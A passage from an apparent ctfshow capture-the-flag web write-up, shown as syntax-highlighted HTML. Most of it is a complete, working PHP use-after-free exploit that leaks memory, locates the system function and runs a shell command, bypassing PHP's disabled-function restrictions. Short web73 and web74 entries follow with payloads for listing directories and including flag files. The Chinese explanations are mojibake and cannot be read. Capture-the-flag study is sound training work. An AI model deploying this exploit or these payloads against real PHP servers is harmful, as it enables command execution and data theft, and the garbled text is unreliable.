punctuation">&#123;</span>    <span class="token variable">$address</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">=</span> <span class="token variable">$s</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token variable">$j</span> <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$j</span><span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$address</span> <span class="token operator">&lt;&lt;</span><span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>        <span class="token variable">$address</span> <span class="token operator">|=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">[</span><span class="token variable">$p</span><span class="token operator">+</span><span class="token variable">$j</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token variable">$address</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">ptr2str</span><span class="token punctuation">(</span><span class="token variable">$ptr</span><span class="token punctuation">,</span> <span class="token variable">$m</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$out</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$m</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$out</span> <span class="token operator">.=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"%c"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token variable">$ptr</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$ptr</span> <span class="token operator">>></span><span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token variable">$out</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">write</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">,</span> <span class="token variable">$v</span><span class="token punctuation">,</span> <span class="token variable">$n</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$n</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$str</span><span class="token punctuation">[</span><span class="token variable">$p</span> <span class="token operator">+</span> <span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"%c"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token variable">$v</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$v</span> <span class="token operator">>></span><span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span><span class="token punctuation">,</span> <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">global</span> <span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token variable">$helper</span><span class="token punctuation">;</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token variable">$addr</span> <span class="token operator">+</span> <span class="token variable">$p</span> <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$helper</span><span class="token operator">-></span><span class="token property">a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$s</span> <span class="token operator">!=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token variable">$leak</span> <span class="token operator">%=</span> <span class="token number">2</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span><span class="token variable">$s</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token variable">$leak</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">parse_elf</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$e_type</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$e_phoff</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$e_phentsize</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$e_phnum</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$e_phnum</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$header</span> <span class="token operator">=</span> <span class="token variable">$base</span> <span class="token operator">+</span> <span class="token variable">$e_phoff</span> <span class="token operator">+</span> <span class="token variable">$i</span> <span class="token operator">*</span> <span class="token variable">$e_phentsize</span><span class="token punctuation">;</span>        <span class="token variable">$p_type</span>  <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$p_flags</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$p_vaddr</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$p_memsz</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">0x28</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$p_type</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$p_flags</span> <span class="token operator">==</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>             <span class="token variable">$data_addr</span> <span class="token operator">=</span> <span class="token variable">$e_type</span> <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">?</span> <span class="token variable">$p_vaddr</span> <span class="token punctuation">:</span> <span class="token variable">$base</span> <span class="token operator">+</span> <span class="token variable">$p_vaddr</span><span class="token punctuation">;</span>            <span class="token variable">$data_size</span> <span class="token operator">=</span> <span class="token variable">$p_memsz</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$p_type</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$p_flags</span> <span class="token operator">==</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>             <span class="token variable">$text_size</span> <span class="token operator">=</span> <span class="token variable">$p_memsz</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$data_addr</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token variable">$text_size</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token variable">$data_size</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token variable">$text_size</span><span class="token punctuation">,</span> <span class="token variable">$data_size</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">get_basic_funcs</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token variable">$elf</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">list</span><span class="token punctuation">(</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token variable">$text_size</span><span class="token punctuation">,</span> <span class="token variable">$data_size</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token variable">$elf</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$data_size</span> <span class="token operator">/</span> <span class="token number">8</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token variable">$i</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">&lt;</span> <span class="token variable">$data_addr</span> <span class="token operator">-</span> <span class="token variable">$base</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$deref</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$leak</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$deref</span> <span class="token operator">!=</span> <span class="token number">0x746e6174736e6f63</span><span class="token punctuation">)</span>                <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">&lt;</span> <span class="token variable">$data_addr</span> <span class="token operator">-</span> <span class="token variable">$base</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$deref</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$leak</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$deref</span> <span class="token operator">!=</span> <span class="token number">0x786568326e6962</span><span class="token punctuation">)</span>                <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$data_addr</span> <span class="token operator">+</span> <span class="token variable">$i</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">get_binary_base</span><span class="token punctuation">(</span><span class="token variable">$binary_leak</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$base</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token variable">$start</span> <span class="token operator">=</span> <span class="token variable">$binary_leak</span> <span class="token operator">&amp;</span> <span class="token number">0xfffffffffffff000</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">0x1000</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$addr</span> <span class="token operator">=</span> <span class="token variable">$start</span> <span class="token operator">-</span> <span class="token number">0x1000</span> <span class="token operator">*</span> <span class="token variable">$i</span><span class="token punctuation">;</span>        <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$leak</span> <span class="token operator">==</span> <span class="token number">0x10102464c457f</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token variable">$addr</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">get_system</span><span class="token punctuation">(</span><span class="token variable">$basic_funcs</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$addr</span> <span class="token operator">=</span> <span class="token variable">$basic_funcs</span><span class="token punctuation">;</span>    <span class="token keyword">do</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$f_entry</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$f_name</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$f_entry</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$f_name</span> <span class="token operator">==</span> <span class="token number">0x6d6574737973</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$addr</span> <span class="token operator">+=</span> <span class="token number">0x20</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$f_entry</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">trigger_uaf</span><span class="token punctuation">(</span><span class="token variable">$arg</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$arg</span> <span class="token operator">=</span> <span class="token function">str_shuffle</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$vuln</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$vuln</span><span class="token operator">-></span><span class="token property">a</span> <span class="token operator">=</span> <span class="token variable">$arg</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token constant">PHP_OS</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'WIN'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'This PoC is for *nix systems only.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$n_alloc</span> <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span> <span class="token variable">$contiguous</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$n_alloc</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token variable">$contiguous</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">str_shuffle</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">trigger_uaf</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'x'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$abc</span> <span class="token operator">=</span> <span class="token variable">$backtrace</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'args'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$helper</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Helper</span><span class="token punctuation">;</span><span class="token variable">$helper</span><span class="token operator">-></span><span class="token property">b</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">79</span> <span class="token operator">||</span> <span class="token class-name">strlen</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"UAF failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$closure_handlers</span> <span class="token operator">=</span> <span class="token function">str2ptr</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$php_heap</span> <span class="token operator">=</span> <span class="token function">str2ptr</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x58</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$abc_addr</span> <span class="token operator">=</span> <span class="token variable">$php_heap</span> <span class="token operator">-</span> <span class="token number">0xc8</span><span class="token punctuation">;</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token variable">$abc_addr</span> <span class="token operator">+</span> <span class="token number">0x60</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token number">0xa</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$closure_obj</span> <span class="token operator">=</span> <span class="token function">str2ptr</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$binary_leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$closure_handlers</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$base</span> <span class="token operator">=</span> <span class="token function">get_binary_base</span><span class="token punctuation">(</span><span class="token variable">$binary_leak</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Couldn't determine binary base address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$elf</span> <span class="token operator">=</span> <span class="token function">parse_elf</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Couldn't parse ELF header"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$basic_funcs</span> <span class="token operator">=</span> <span class="token function">get_basic_funcs</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token variable">$elf</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Couldn't get basic_functions address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$zif_system</span> <span class="token operator">=</span> <span class="token function">get_system</span><span class="token punctuation">(</span><span class="token variable">$basic_funcs</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Couldn't get zif_system address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$fake_obj_offset</span> <span class="token operator">=</span> <span class="token number">0xd0</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">0x110</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">+=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token variable">$fake_obj_offset</span> <span class="token operator">+</span> <span class="token variable">$i</span><span class="token punctuation">,</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$closure_obj</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token variable">$abc_addr</span> <span class="token operator">+</span> <span class="token variable">$fake_obj_offset</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0xd0</span> <span class="token operator">+</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0xd0</span> <span class="token operator">+</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token variable">$zif_system</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">(</span><span class="token variable">$helper</span><span class="token operator">-></span><span class="token property">b</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">ctfshow</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cat /flag0.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ob_end_flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></code></pre><h4 id="web73"><a href="#web73" class="headerlink" title="web73"></a>web73</h4><p>È¶ñÂÖàÊü•Êâæflag‰ΩçÁΩÆ,ÁÑ∂Âêé‰ΩøÁî®Êñá‰ª∂ÂåÖÂê´ÂæóÂà∞flag</p><p>Payload:</p><blockquote><p>1„ÄÅc&#x3D;var_export(scandir(‚Äò&#x2F;‚Äò));exit(0);c&#x3D;require_once(‚Äò&#x2F;flagc.txt‚Äô);exit(0);</p><p>2„ÄÅc&#x3D;?&gt;<?php $a=new DirectoryIterator("glob://./*");foreach($a as $f){   echo($f->__toString().' ');}exit(0);?></p><p>c&#x3D;include(‚Äòflagc.txt‚Äô);exit(0);</p></blockquote><h4 id="web74"><a href="#web74" class="headerlink" title="web74"></a>web74</h4><p>scandirÂáΩÊï∞Ë¢´ban‰∫ÜÔºå‰ΩøÁî®DirectoryIteratorÁ±ªÔºåflagÂú®&#x2F;flagx.txt</p><p>ÊàñËÄÖ‰ΩøÁî®globÂçèËÆÆ</p><p>Payload:</p><blockquote><p>c&#x3D;var_export(glob(‚Äò..&#x2F;..&#x2F;..‚Äô.‚Äô&#x2F;*‚Äô));exit(0);</p></blockquote><h4 id="web75-Sql-load-file"><a href="#web75-Sql-load-file" class="headerlink" title="web75(Sql 